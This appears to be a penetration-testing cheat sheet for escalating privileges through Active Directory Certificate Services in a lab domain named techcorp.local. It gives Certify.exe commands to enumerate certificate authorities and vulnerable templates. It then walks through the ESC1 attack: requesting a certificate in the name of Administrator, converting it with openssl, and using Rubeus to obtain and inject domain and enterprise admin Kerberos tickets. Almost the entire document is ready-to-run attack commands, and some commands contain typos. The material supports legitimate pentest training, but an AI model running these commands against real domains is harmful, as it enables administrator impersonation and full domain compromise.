# Methodology
>1. Enumerate templates.
>2. Follow steps for specific escalation scenario.

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## Certify
**Enumerate all Certificate Authorities (CA) in the domain:**
```cmd
Certifi.exe cas
```

**Enumerate templates:**
```cmd
Certify.exe find
```

**Enumerate vulnerable templates:**
```cmd
Certify.exe find /vulnerable
```

>**ℹ️ Info:**
>It may appear as if not templates are vulnerable if the command doesn't return any of them, that's why it's important to enumerate them all and check manually if we can abuse some of them if we compromise another user. 

### ESC1
**Enroll in template and copy private key to a file:**
```cmd
Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

**Change RSA to PFX:**
```cmd
openssl.exe pkcs12 -in cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out DA.pfx
```

**Request TGT with the PFX:**
```cmd
# Request a TGT and inject it
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt

# Request a enterprise admin TGT and inject it
Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```